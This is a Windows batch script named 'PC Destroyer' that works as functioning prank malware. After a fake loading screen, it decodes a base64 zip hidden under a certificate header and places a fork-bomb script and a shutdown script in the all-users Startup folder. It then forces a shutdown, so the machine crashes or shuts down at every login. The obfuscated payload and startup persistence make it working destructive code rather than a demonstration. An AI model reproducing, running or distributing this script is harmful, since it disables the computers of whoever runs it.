@ECHO OFF
cd /d %~dp0
chcp 65001>nul
title PC Destroyer By Memer
color A
mode 100,8
:START
set TAGS=%TAGS%█████
set /A LOAD=%LOAD%+5
echo[
echo This Isnt A Joke, This WILL Destroy Your PC
echo If You Still Wish To Continue, Wait For The Loading To Finish
echo[
echo[
echo %TAGS%
echo Loading... %LOAD%%%
TIMEOUT 1 /NOBREAK >nul
cls
IF %LOAD% NEQ 100 goto START
echo Destroying Windows...
certutil -f -decode "%~nx0" "%cd%\temp.zip" >nul
powershell Expand-Archive -Path '%cd%\temp.zip' -DestinationPath '%cd%\temp' -force
cls
erase temp.zip
cd /d temp
copy close.cmd "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\" >nul
copy bomb.cmd "%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp\" >nul
cd /d ..
RD /S /Q temp
shutdown /S /T 10 /C "You Have 10 Seconds To Use This PC Before It Dies  :)"
exit
-----BEGIN CERTIFICATE-----
UEsDBBQAAAAAAO6NhVJJFaqAEQAAABEAAAALAAAAYWEvQm9tYi5jbWQ6QQ0Kc3Rh
cnQNCmdvdG8gQVBLAwQUAAAAAAAUjoVSeITSNxMAAAATAAAADAAAAGFhL0Nsb3Nl
LmNtZHNodXRkb3duIC9TIC9DICI6KSJQSwECFAAUAAAAAADujYVSSRWqgBEAAAAR
AAAACwAAAAAAAAABACAAAAAAAAAAYWEvQm9tYi5jbWRQSwECFAAUAAAAAAAUjoVS
eITSNxMAAAATAAAADAAAAAAAAAABACAAAAA6AAAAYWEvQ2xvc2UuY21kUEsFBgAA
AAACAAIAcwAAAHcAAAAAAA==
-----END CERTIFICATE-----